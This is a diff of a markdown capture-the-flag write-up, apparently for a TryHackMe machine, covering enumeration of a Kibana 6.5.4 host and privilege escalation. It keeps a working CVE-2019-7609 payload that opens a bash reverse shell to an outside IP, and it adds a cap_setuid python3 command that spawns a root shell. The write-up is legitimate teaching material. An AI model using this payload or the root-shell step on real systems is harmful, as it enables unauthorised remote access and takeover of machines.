@@ -74,8 +74,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 # Port 80
 Enumerated with whatweb, nikto, dirb. Not much useful information for now
-Only linux capabilities?/?
-
+What's up with the linux capabilities?.., Maybe something to keep in mind for later.
+![](80home.png)
 # port 5044
 Nmap gave no info about port 5044. I checked it with nc to grab the banner. Also no results:
 
@@ -91,14 +91,17 @@ Let's continue
 # Port 5601
 From the nmap results we can see that there is an http 302 code. which means a redirect. When we visit:
 http://kiba.thm:5601 we get redirected to http://kiba.thm:5601/app/kibana
-
+![](kib1.png)
 After googling what kibana is:
 
 > Kibana is an free and open frontend application that sits on top of the Elastic Stack, providing search and data visualization capabilities for data indexed in Elasticsearch.
 
 We will enumerate the application and look For some version numbers.
 
-Got io! We fund the version by clivking on Management. Version: 6.5.4
+
+![](kibversion.png)
+
+Got it! We fund the version by clivking on Management. Version: 6.5.4
 
 # Exploit
 After googling for 'kibana 6.5.4 vulnerabilites' We finnd cve-2019-7609. This vulnerabultity allows us to execute code on the machine.
@@ -109,23 +112,29 @@ Instructions for the expoloit can be found here: https://github.com/mpgn/CVE-201
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.40.46/443 0>&1\'");//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 ```
+![](exploit1.png)
+
 BAM! We have a shell as user 'kiba'. We can read the user flag from kiba's home directory.
 
 # Pivileges escalation
 Linpeas showed an interesting file with capabilites:
-
+![](capabilites.png)
 Manual searching for binaries with capabilites:
+
 ```sh
 getcap -r / 2>/dev/null
 ```
 
-Capabilites https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Some info about Capabilites: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
 
-cap_setuid+ep
+We can exploit this misconfiguration with:
+
 
 ```sh
 /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
+![](rootflag.png)
+
 So what happens here:
  The CAP_SETUID capability is described as: Make arbitrary manipulations of process UIDs [source](https://man7.org/linux/man-pages/man7/capabilities.7.html)
  UID is the User Identifier. A process carries the UID pf the user who started the process. The UID is used to decide teh privilege to preform operations on resources.
@@ -146,6 +155,9 @@ Then we can get the UID of the process with:
 ```sh
 ps -p <PID> -o uid
 ```
+
+![](uid1.png)
+
 Here we see that the UID is 1000
 
 Now with the UID set to 0:
@@ -154,3 +166,5 @@ Now with the UID set to 0:
 ```
 Here we see that we are runing the process as the user root and the UID is set to 0 as we expected.
 
+
+![](uidroot.png)
